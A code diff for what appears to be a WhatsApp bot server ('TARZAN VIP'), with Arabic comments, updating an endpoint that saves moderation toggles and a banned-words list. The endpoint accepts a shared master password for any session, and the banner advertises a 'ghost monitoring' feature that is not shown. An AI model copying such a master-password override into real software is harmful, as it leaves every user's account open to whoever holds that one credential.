     if (settings.password !== password && password !== MASTER_PASSWORD) return res.status(401).json({ error: 'كلمة مرور خاطئة' });
     
+    // إعداداتك الأساسية
     botSettings[sessionId].botEnabled = !!botEnabled;
     botSettings[sessionId].commandsEnabled = !!commandsEnabled;
     botSettings[sessionId].aiEnabled = !!aiEnabled; 
     botSettings[sessionId].autoReact = !!autoReact;
     botSettings[sessionId].reactEmoji = reactEmoji || '❤️';
-
-    // 🌟 حفظ الميزات الجديدة
+    
+    // إعدادات الترسانة من لوحة الويب
     botSettings[sessionId].antiCall = !!antiCall;
     botSettings[sessionId].antiLink = !!antiLink;
     botSettings[sessionId].antiSpam = !!antiSpam;
     botSettings[sessionId].antiBadWords = !!antiBadWords;
     botSettings[sessionId].antiBot = !!antiBot;
     botSettings[sessionId].autoStatusSave = !!autoStatusSave;
+
+    // استقبال الكلمات الممنوعة من الويب
     if (Array.isArray(badWordsList)) {
         botSettings[sessionId].badWordsList = badWordsList;
     }
-    
+
     saveSettings();
     res.json({ success: true, message: '✅ تم حفظ التعديلات' });
 });
@@ -638,9 +667,9 @@ app.post('/delete-session', (req, res) => {
 
 app.listen(PORT, () => {
     console.log(`\n=========================================`);
-    console.log(`🚀 سيرفر TARZAN VIP يعمل بقوة على منفذ ${PORT}`);
+    console.log(`🚀 سيرفر TARZAN VIP 20 يعمل بقوة على منفذ ${PORT}`);
     console.log(`🛡️ وضع الحماية من الانهيار مفعل بنجاح`);
     console.log(`🧠 نظام الذكاء الاصطناعي (TARZAN AI) مدمج وجاهز`);
-    console.log(`👻 نظام المراقبة الشبحية متاح الآن`);
+    console.log(`👻 نظام المراقبة الشبحية والترسانة العسكرية يعملان معاً`);
     console.log(`=========================================\n`);
 });
